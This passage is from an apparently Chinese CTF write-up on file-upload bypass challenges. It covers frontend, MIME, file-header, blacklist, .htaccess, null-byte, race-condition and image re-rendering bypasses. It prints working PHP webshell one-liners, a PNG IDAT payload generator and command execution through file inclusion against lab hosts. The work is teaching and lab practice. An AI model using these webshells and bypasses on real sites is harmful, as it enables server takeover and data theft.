class="subst">&#123;data&#125;</span>\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="10-没有简单的弱口令"><a href="#10-没有简单的弱口令" class="headerlink" title="10.没有简单的弱口令"></a>10.没有简单的弱口令</h3><p>验证码只能用一次   验证码爆破 </p><ul><li>利用burp的插件来进行验证码识别爆破</li><li>用captcha-killer插件，开源地址:<a href="https://github.com/cOny1/captcha-killer">https://github.com/cOny1/captcha-killer</a></li><li>工具 ：pkavhttpfuzzer  爱盘BP 1.7  captcha</li></ul><ol><li>将测试包粘贴到工具中 添加字典 </li><li>添加验证码标记 写入验证码地址</li><li>验证码识别重放模式：单线程</li></ol><hr><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p><a href="https://image.3001.net/images/20201025/16035981315620.png"><img src="https://image.3001.net/images/20201025/16035981315620.png" alt="img"></a></p><p>如何判断是否是前端验证呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><a href="https://image.3001.net/images/20201025/16036095176123.png"><img src="https://image.3001.net/images/20201025/16036095176123.png" alt="img"></a></p><h2 id="解法一：抓包"><a href="#解法一：抓包" class="headerlink" title="解法一：抓包"></a>解法一：抓包</h2><p>因为是前段验证的问题，可以直接将 shell.php 重命名为 shell.png 上传抓包的时候再将文件名修改为 shell.php 即可绕过前段限制，成功上传 webshell。</p><h2 id="解法二：禁用-JS"><a href="#解法二：禁用-JS" class="headerlink" title="解法二：禁用 JS"></a>解法二：禁用 JS</h2><p>因为 JS 来校验文件后缀的原因，所以可以直接在浏览器上禁用 JS 这样就可以直接上传文件了。Chrome 内核的浏览器在审查元素的状态下可以找到 Settings 选项，然后找到 「Debugger」 选项下面直接勾选 「Disable JavaScript」即可。</p><h2 id="解法三：调试-JS"><a href="#解法三：调试-JS" class="headerlink" title="解法三：调试 JS"></a>解法三：调试 JS</h2><p>这种解法就类似于孔乙己中的茴香豆的 「茴」有几种写法？，纯粹就是为了炫技，但是并不实用，那么国光下面就简单说下调试 JS 的过程吧。</p><p>首先审查元素下下断点：</p><p><a href="https://image.3001.net/images/20201025/16036082412704.png"><img src="https://image.3001.net/images/20201025/16036082412704.png" alt="img"></a></p><p>单行单步调试，找到 <code>whitelist</code> 变量，双击元素然后直接修改数组元素的值 ：</p><p><a href="https://image.3001.net/images/20201025/16036087605888.png"><img src="https://image.3001.net/images/20201025/16036087605888.png" alt="img"></a></p><p>放掉数据包，之前的 shell.php 可直接上传成功：</p><p><a href="https://image.3001.net/images/20201025/1603608623108.png"><img src="https://image.3001.net/images/20201025/1603608623108.png" alt="img"></a></p><p>成功拿到根目录下的 flag：</p><p><a href="https://image.3001.net/images/20201025/16036086662827.png"><img src="https://image.3001.net/images/20201025/16036086662827.png" alt="img"></a></p><h1 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h1><p>这样下去感觉上课都不需要 PPT 了，关键姿势点都直接贴在了题目中了：</p><p><a href="https://image.3001.net/images/20201025/16036091167949.png"><img src="https://image.3001.net/images/20201025/16036091167949.png" alt="img"></a></p><p>因为提示了 MIME 类型校验，所以抓取上传的数据包然后直接修改 <code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型即可：</p><p><a href="https://image.3001.net/images/20201026/1603684549564.png"><img src="https://image.3001.net/images/20201026/1603684549564.png" alt="img"></a></p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>本题配图中里面包含了 GIF89a 已经很明显了，答案就在题目中：</p><p><a href="https://image.3001.net/images/20201025/16036097871368.png"><img src="https://image.3001.net/images/20201025/16036097871368.png" alt="img"></a></p><p>本题校验了图片的文件头也就是校验图片内容的，这个时候使用一个标准的图马是可以成功绕过的，由于国光的这个代码只校验了前面几个字节，所以直接写 GIF89a 即可成功绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846031002.png"><img src="https://image.3001.net/images/20201026/16036846031002.png" alt="img"></a></p><h1 id="缺陷的代码-1"><a href="#缺陷的代码-1" class="headerlink" title="缺陷的代码 - 1"></a>缺陷的代码 - 1</h1><p>本题的图片上的第 2 行代码是一个有缺陷的代码，黑名单关键词替换为空的操作是一种不安全的写法：</p><p><a href="https://image.3001.net/images/20201025/16036102265581.png"><img src="https://image.3001.net/images/20201025/16036102265581.png" alt="img"></a></p><p>因为代码开发者的错误写法，这种情况下可以直接使用嵌套后缀绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846312806.png"><img src="https://image.3001.net/images/20201026/16036846312806.png" alt="img"></a></p><h1 id="缺陷的代码-2"><a href="#缺陷的代码-2" class="headerlink" title="缺陷的代码 - 2"></a>缺陷的代码 - 2</h1><p>本地属于理论上漏洞，因为题目环境是 Docker 容器运行的 Linux 系统，所以本题国光修改成了 Windows 的特性</p><p><a href="https://image.3001.net/images/20201025/1603610505374.png"><img src="https://image.3001.net/images/20201025/1603610505374.png" alt="img"></a></p><p>同理图片提示中的第 2 行代码也是有缺陷的，可以仅用了 <code>str_replace</code> 替换，这样很容易就被大小写绕过，因为 Windows 环境下不区分大小写，所以就可以让 .PHp 当做 .php 来解析了，但是 Linux 下这种大小写如果的话完全没作用，所以本题是国光自己造的漏洞，用来伪造 Windows 环境下的大小写不区分的情况：</p><p><a href="https://image.3001.net/images/20201026/1603684654836.png"><img src="https://image.3001.net/images/20201026/1603684654836.png" alt="img"></a></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p>本题同样题目的配图中暗示已经比较明显了，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP：</p><p><a href="https://image.3001.net/images/20201025/16036116763150.png"><img src="https://image.3001.net/images/20201025/16036116763150.png" alt="img"></a></p><p>那么这里 Fuzz 一下，发现这些稍微冷门的后缀都可以直接绕过：</p><p><a href="https://image.3001.net/images/20201026/16036846759511.png"><img src="https://image.3001.net/images/20201026/16036846759511.png" alt="img"></a></p><h1 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h1><p>本题的暗示也已经很明显了，只要选手查询 htaccess 怎么解析的话，就可以很顺利的解题：</p><p><a href="https://image.3001.net/images/20201025/160361194314.png"><img src="https://image.3001.net/images/20201025/160361194314.png" alt="img"></a></p><p>因为题目是考擦 htaccess 这个上传知识点，所以先准备一个解析规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>然后先上传这个 .htaccess 文件到服务器的 upload 目录下：</p><p><a href="https://image.3001.net/images/20201026/16036846984498.png"><img src="https://image.3001.net/images/20201026/16036846984498.png" alt="img"></a></p><p>这表示将 upload 目录下的所有 png 图片都当做 php 来解析，然后再上传一个 shell.png 即可：</p><p><a href="https://image.3001.net/images/20201026/16036847615642.png"><img src="https://image.3001.net/images/20201026/16036847615642.png" alt="img"></a></p><p>此时这个 shell.png 就已经被当做 PHP 解析了：</p><p><a href="https://image.3001.net/images/20201025/16036122801854.png"><img src="https://image.3001.net/images/20201025/16036122801854.png" alt="img"></a></p><h1 id="古老的漏洞-1"><a href="#古老的漏洞-1" class="headerlink" title="古老的漏洞 - 1"></a>古老的漏洞 - 1</h1><p>本题依然在题目中科普了 00 截断是啥，以及 00 截断的利用条件：</p><p><a href="https://image.3001.net/images/20201025/16036124585228.png"><img src="https://image.3001.net/images/20201025/16036124585228.png" alt="img"></a></p><p>00 截断多配合路径来截断，我们来抓包看看应该是存在路径信息的，然后直接在路径后面使用 %00 来截断一下就可以成功绕过，为啥 %00 直接就可以绕过了呢？这是因为路径信息是从 GET 方式传递个后端的，这样默认会进行一次 URL 解码，%00 解码后就是空字节：</p><p><a href="https://image.3001.net/images/20201026/16036847876825.png"><img src="https://image.3001.net/images/20201026/16036847876825.png" alt="img"></a></p><p>这样保存的文件名就是这样的效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/apache2/htdocs/upload/new.php%00shell.png</span><br></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell</p><p><a href="https://image.3001.net/images/20201025/16036127173608.png"><img src="https://image.3001.net/images/20201025/16036127173608.png" alt="img"></a></p><h1 id="古老的漏洞-2"><a href="#古老的漏洞-2" class="headerlink" title="古老的漏洞 - 2"></a>古老的漏洞 - 2</h1><p>国光这一题偷懒了，没有换题目外观，不过选手们抓包就会发现这是一个 POST 型的 00 截断：</p><p><a href="https://image.3001.net/images/20201025/16036129575787.png"><img src="https://image.3001.net/images/20201025/16036129575787.png" alt="img"></a></p><p>既然是 POST 型 00 截断那么就直接抓包吧，需要在 BP 里面写一个 %00 然后再 URL 手动解码一下：</p><p><a href="https://image.3001.net/images/20201025/16036131049530.png"><img src="https://image.3001.net/images/20201025/16036131049530.png" alt="img"></a></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>本题是一个条件竞争漏洞，也在题目中给了关键的功能代码贴图，以及给了解题思路了：</p><p><a href="https://image.3001.net/images/20201025/16036135842482.png"><img src="https://image.3001.net/images/20201025/16036135842482.png" alt="img"></a></p><p>条件竞争的话稍微和正常的上传姿势不一样，先把题目中给的 webshell 信息复制出来备用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后先上传 shell.php 文件：</p><p><a href="https://image.3001.net/images/20201026/16036848394730.png"><img src="https://image.3001.net/images/20201026/16036848394730.png" alt="img"></a></p><p>BP 抓取这个数据包然后发送到 Intruder 测试器中使用 NULL 空值无限爆破：</p><p><a href="https://image.3001.net/images/20201025/16036138407749.png"><img src="https://image.3001.net/images/20201025/16036138407749.png" alt="img"></a></p><p>然后抓取访问 shell.php 的数据包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTPGET /upload/shell.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vul.xps.com:<span class="number">30009</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.14</span>; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure><p>依然使用 NULL 空值爆破：</p><p><a href="https://image.3001.net/images/20201025/16036140058678.png"><img src="https://image.3001.net/images/20201025/16036140058678.png" alt="img"></a></p><p>最后成功在服务器的 upload 目录下生成 xiao.php 里的内容就是一个标准的 webshell：</p><p><a href="https://image.3001.net/images/20201025/16036153403524.png"><img src="https://image.3001.net/images/20201025/16036153403524.png" alt="img"></a></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p>这一题取材于 upload-labs 后面新增的题目：</p><p><a href="https://image.3001.net/images/20201025/1603615449643.png"><img src="https://image.3001.net/images/20201025/1603615449643.png" alt="img"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure><p>当 <code>$img_path</code> 可控的时候，还会忽略掉 <code>$img_path</code> 后面的 <code>/.</code> ，这一点发现最早是 <a href="https://www.smi1e.top/">Smile</a> 师傅于 2019 年 2 月份提出来的，TQL !!! 既然知道 move_uploaded_file 的这个小缺陷的话，这样既可直接 Getshell：</p><p><a href="https://image.3001.net/images/20201025/16036161031022.png"><img src="https://image.3001.net/images/20201025/16036161031022.png" alt="img"></a></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的，另外这一题我特意还给了查看提示的按钮：</p><p><a href="https://image.3001.net/images/20201025/1603616269318.png"><img src="https://image.3001.net/images/20201025/1603616269318.png" alt="img"></a></p><p>点击这个查看提示会出现如下页面：</p><p><a href="https://image.3001.net/images/20201025/16036164852192.png"><img src="https://image.3001.net/images/20201025/16036164852192.png" alt="img"></a></p><p>注意 URL 发生了变化，没错这里是一个文件包含漏洞，这样包含选手们逃避渲染上传后的图片的话就可以直接 getshell 了：</p><p><a href="https://image.3001.net/images/20201025/16036165628118.png"><img src="https://image.3001.net/images/20201025/16036165628118.png" alt="img"></a></p><p>接下来要总结一下二次渲染的细节了，这也是耗费时间写本文的主要动力之一，因为上面的那些知识点都比较常规，这个二次渲染的细节国光我一直都没有深入总结过，正好就放这里总结一下。</p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>渲染前后的两张 GIF，没有发生变化的数据库部分直接插入 Webshell 即可</p><p>首先准备一张迷你的 GIF</p><p><a href="https://image.3001.net/images/20201025/16036176592096.gif"><img src="https://image.3001.net/images/20201025/16036176592096.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036252666623.gif"><img src="https://image.3001.net/images/20201025/16036252666623.gif" alt="img"></a></p><p>使用 010Editor 打开这两个文件，在 「Tools」选项下面找到「Compare Files」即可对比两个文件内容：</p><p><a href="https://image.3001.net/images/20201025/1603625929446.png"><img src="https://image.3001.net/images/20201025/1603625929446.png" alt="img"></a></p><p>对比的效果如下，其中灰的部分就是内容一致的部分：</p><p><a href="https://image.3001.net/images/20201025/16036266297353.png"><img src="https://image.3001.net/images/20201025/16036266297353.png" alt="img"></a></p><p>那么只需要将 PHP 代码插入到灰色的部分即可：</p><p><a href="https://image.3001.net/images/20201025/16036267273505.png"><img src="https://image.3001.net/images/20201025/16036267273505.png" alt="img"></a></p><p>修改后的 gif 图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036267469060.gif"><img src="https://image.3001.net/images/20201025/16036267469060.gif" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036268187614.gif"><img src="https://image.3001.net/images/20201025/16036268187614.gif" alt="img"></a></p><p>此时查看一下发现我们的 payload 内容依然存在：</p><p><a href="https://image.3001.net/images/20201026/16036850183974.png"><img src="https://image.3001.net/images/20201026/16036850183974.png" alt="img"></a></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。首先准备一个 PNG 图片：</p><p><a href="https://image.3001.net/images/20201025/16036276956867.png"><img src="https://image.3001.net/images/20201025/16036276956867.png" alt="img"></a></p><p>两次渲染后对比一下，发现除了 PNG 文件头，其他部分全都不一致：</p><p><a href="https://image.3001.net/images/20201025/16036285349399.png"><img src="https://image.3001.net/images/20201025/16036285349399.png" alt="img"></a></p><p>看来使用 GIF 那种思路是行不通的了。PNG 的解决方法继续往下面看。</p><h3 id="写入-PLTE-数据块"><a href="#写入-PLTE-数据块" class="headerlink" title="写入 PLTE 数据块"></a>写入 PLTE 数据块</h3><p>关于实现细节以前乌云知识库的一篇文章写的很详细，感兴趣的朋友可以阅读看看：</p><p><a href="https://wooyun.x10sec.org/static/drops/tips-16034.html">WooYun 乌云 - php imagecreatefrom* 系列函数之 png</a></p><p>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终。</p><p>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py">Github - poc_png.py</a></p><p>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</p><p><a href="https://image.3001.net/images/20201025/16036303454787.png"><img src="https://image.3001.net/images/20201025/16036303454787.png" alt="img"></a></p><p>修改的索引图片如下：</p><p><a href="https://image.3001.net/images/20201025/16036304687175.png"><img src="https://image.3001.net/images/20201025/16036304687175.png" alt="img"></a></p><p>然后使用 Python2 运行脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p>生成新的 gg_shell.png 图片如下：</p><p><a href="https://image.3001.net/images/20201025/1603630522797.png"><img src="https://image.3001.net/images/20201025/1603630522797.png" alt="img"></a></p><p>这个图片是带 payload 的：</p><p><a href="https://image.3001.net/images/20201025/16036306183035.png"><img src="https://image.3001.net/images/20201025/16036306183035.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036307974999.png"><img src="https://image.3001.net/images/20201025/16036307974999.png" alt="img"></a></p><p>来检测一下我们的 payload 是否还存在了：</p><p><a href="https://image.3001.net/images/20201025/16036344921925.png"><img src="https://image.3001.net/images/20201025/16036344921925.png" alt="img"></a></p><p>哎貌似不对劲：</p><p><a href="https://image.3001.net/images/20201025/16036345974560.png"><img src="https://image.3001.net/images/20201025/16036345974560.png" alt="img"></a></p><p>这个字符串被渲染后貌似是顺序有点奇怪。这里国光踩了很多坑，查了很多资料网上都没有好的解决方案，最后国光<strong>将这个被目标网站渲染后的图片再上传渲染</strong>，下面是渲染后的图片：</p><p><a href="https://image.3001.net/images/20201025/16036348898441.png"><img src="https://image.3001.net/images/20201025/16036348898441.png" alt="img"></a></p><p>赶紧来查看一下里面是否包含图马信息：</p><p><a href="https://image.3001.net/images/20201025/16036348742287.png"><img src="https://image.3001.net/images/20201025/16036348742287.png" alt="img"></a></p><p>阿这！居然成功了，真的是功夫不负有心人呐，不枉国光我周末大半夜的在公司加班写的这篇文章了！！！泪目</p><h3 id="写入-IDAT-数据块"><a href="#写入-IDAT-数据块" class="headerlink" title="写入 IDAT 数据块"></a>写入 IDAT 数据块</h3><p>PNG 也是可以写入 IDAT 数据来绕过渲染的，由于快 23.00 了国光没有多余的时间研究里面细节了，这里直接引用了先知里面提供的一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接运行生成会在脚本目录下生成 shell.png 图片，下面是生成好的 图片：</p><p><a href="https://image.3001.net/images/20201025/16036353722974.png"><img src="https://image.3001.net/images/20201025/16036353722974.png" alt="img"></a></p><p>其内容如下：</p><p><a href="https://image.3001.net/images/20201025/16036354976650.png"><img src="https://image.3001.net/images/20201025/16036354976650.png" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201025/16036356271476.png"><img src="https://image.3001.net/images/20201025/16036356271476.png" alt="img"></a></p><p>查看一下里面的 payload 是否还存在：</p><p><a href="https://image.3001.net/images/20201025/16036357015967.png"><img src="https://image.3001.net/images/20201025/16036357015967.png" alt="img"></a></p><p>依然存在的，成功绕过渲染 ，这里顺便提一下这个 shell 的使用方法，下面就不再补充了。</p><p>首先获取图片的上传地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/1603635794598.png"><img src="https://image.3001.net/images/20201025/1603635794598.png" alt="img"></a></p><p>利用网站本身的文件包含漏洞，尝试直接包含这个图马 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036358617110.png"><img src="https://image.3001.net/images/20201025/16036358617110.png" alt="img"></a></p><p>貌似成功了，执行命令看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vul.xps.com:30010/?0=system&amp;file=./upload/357481464.png</span><br></pre></td></tr></table></figure><p>POST 内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=<span class="built_in">cat</span> /f14a4a4a4a444g</span><br></pre></td></tr></table></figure><p><a href="https://image.3001.net/images/20201025/16036360607524.png"><img src="https://image.3001.net/images/20201025/16036360607524.png" alt="img"></a></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG 也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试。</p><p>这个脚本 Github 搜索一下很多项目都有这个脚本，这里国光就随便搜索拿了搜索结果第一个的项目放在本文中。</p><p><strong>项目地址</strong>：<a href="https://github.com/BlackFan/jpg_payload">Github - lackFan&#x2F;jpg_payload</a></p><p>准备一个 jpg 图片：</p><p><a href="https://image.3001.net/images/20201026/16036693924901.jpg"><img src="https://image.3001.net/images/20201026/16036693924901.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603669426842.jpg"><img src="https://image.3001.net/images/20201026/1603669426842.jpg" alt="img"></a></p><p>接着使用脚本来插入 payload，如果想要修改默认 payload 的话，自行修改脚本中的下部分代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后运行脚本插入 payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php jpg_payload.php 122728342.jpg</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><p>生成的新图片为：</p><p><a href="https://image.3001.net/images/20201026/16036747206733.jpg"><img src="https://image.3001.net/images/20201026/16036747206733.jpg" alt="img"></a></p><p>然后上传到目标网站上面渲染一下再导出：</p><p><a href="https://image.3001.net/images/20201026/1603674733221.jpg"><img src="https://image.3001.net/images/20201026/1603674733221.jpg" alt="img"></a></p><p>那么来查看一下最终这个 JPG 里面是否带有 payload 信息：</p><p><a href="https://image.3001.net/images/20201026/16036748931486.png"><img src="https://image.3001.net/images/20201026/16036748931486.png" alt="img"></a></p><p>无疑写 phpinfo () 是很容易成功的，但是 phpinfo () 并无实质性危害，我们需要插入真正的 webshell 才可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里非常玄学，在国光经历了不知道多少次失败后，才成功将上面的 payload 完整插入</p></blockquote><p><a href="https://image.3001.net/images/20201026/1603675937154.jpg"><img src="https://image.3001.net/images/20201026/1603675937154.jpg" alt="img"></a></p><p>这个图马被 imagecreatefromjpeg 渲染后如下：</p><p><a href="https://image.3001.net/images/20201026/16036760334176.jpg"><img src="https://image.3001.net/images/20201026/16036760334176.jpg" alt="img"></a></p><p>查看一下 payload 是否存在：</p><p><a href="https://image.3001.net/images/20201026/16036761717904.png"><img src="https://image.3001.net/images/20201026/16036761717904.png" alt="img"></a></p><p>完美，尝试直接文件包含来执行攻击语句试试看：</p><p><a href="https://image.3001.net/images/20201026/16036764145479.png"><img src="https://image.3001.net/images/20201026/16036764145479.png" alt="img"></a></p><p><strong>JPG 坑点总结</strong></p><ol><li>需要被 imagecreatefromjpeg 渲染或再用工具</li><li>图片找的稍微大一点 成功率更高</li><li>Payload 语句越短成功率越高</li><li>一张图片不行就换一张 不要死磕</li><li>国光补充：貌似白色的图片成功率也比较高</li><li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种 payload 成功率很高</li></ol><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码审计这一题如果可以动态调试的话，那么理解起来就会比较简单：</p><p><a href="https://image.3001.net/images/20201026/16036775446476.png"><img src="https://image.3001.net/images/20201026/16036775446476.png" alt="img"></a></p><p>这个题目是直接 copy Upload-labs 里面的最后一关，这个貌似还是后面新增的题目，下面是核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 